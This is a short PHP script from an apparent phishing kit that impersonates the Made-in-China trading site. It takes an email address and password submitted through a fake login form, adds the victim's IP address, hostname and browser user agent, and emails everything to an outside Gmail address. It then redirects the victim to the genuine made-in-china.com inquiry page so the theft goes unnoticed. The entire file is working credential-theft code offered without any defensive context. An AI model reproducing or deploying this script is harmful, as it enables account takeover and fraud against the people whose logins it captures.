<?php
if($_POST["eml"] != "" and $_POST["eps"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Made in China Info-----------------------\n";
$message .= "Email address            : ".$_POST['eml']."\n";
$message .= "Email Password           : ".$_POST['eps']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "inboxparker2020@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.made-in-china.com/inquiry-basket/");
}else{
header ("Location: index.php");
}

?>